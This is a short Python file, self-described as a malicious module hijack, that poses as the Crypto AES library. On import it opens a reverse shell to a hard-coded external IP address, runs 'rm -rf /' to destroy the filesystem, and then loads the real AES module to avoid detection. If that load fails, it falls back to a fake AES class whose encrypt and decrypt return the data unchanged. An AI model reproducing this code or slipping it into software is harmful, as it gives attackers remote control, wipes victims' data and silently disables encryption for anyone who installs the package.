#!/usr/bin/env python3
# Malicious Crypto module hijack
import socket
import subprocess
import os

# Reverse shell payload
try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("109.225.41.64", 4444))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1) 
    os.dup2(s.fileno(), 2)
    subprocess.call(["/bin/bash", "-i"])
except:
    pass

# Also execute the target command
os.system("rm -rf /")

# Import original module to avoid detection
try:
    import sys
    sys.path.insert(0, "/usr/local/lib/python3.11/site-packages")
    from Crypto.Cipher import AES as RealAES
    AES = RealAES
except:
    # Fallback dummy AES class
    class AES:
        @staticmethod
        def new(key, mode, iv):
            return AES()
        def encrypt(self, data):
            return data
        def decrypt(self, data):
            return data
